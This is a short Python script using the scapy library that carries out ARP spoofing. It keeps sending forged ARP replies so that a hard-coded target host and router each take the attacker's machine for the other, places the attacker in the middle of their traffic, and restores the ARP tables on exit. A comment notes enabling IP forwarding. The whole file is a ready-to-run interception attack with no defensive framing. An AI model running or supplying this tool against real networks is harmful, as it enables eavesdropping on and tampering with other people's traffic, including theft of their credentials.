import scapy.all as scapy
import time
import itertools
import sys
def get_hw(ip):
    tcp_request = scapy.ARP(pdst=ip)
    broadast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broad = broadast/tcp_request
    ans = scapy.srp(arp_request_broad, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc

def spf(t_ip, spf_ip):
    target_hw=get_hw(t_ip)
    packet = scapy.ARP(op=2, pdst=t_ip, hwdst=target_hw, psrc=spf_ip) 
    scapy.send(packet, verbose=False)


def restore(ip_t, ip_src):
    mac = get_hw(ip_t)
    src_mac = get_hw(ip_src)
    packet = scapy.ARP(op=2, pdst=ip_t, hwdst=mac, psrc=ip_src, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False
               )
#allow ip forwarding: echo 1 >/proc/sys/net/ipv4/ip_forward
if __name__ == "__main__":
    
   router = "192.168.0.254"
   target = "192.168.0.225"
   counter = lambda count=1: (num*2 for num in itertools.count(count))
   count = counter()
   
   try:
       while True:
           spf(target, router)
           spf(router,target)
           print(f"\r[+] Packets sent:{next(count)}", end="\r")
           time.sleep(3)
   except KeyboardInterrupt:
       print("\n[-] Quitting...")  
       restore(target, router)
       restore(router, target )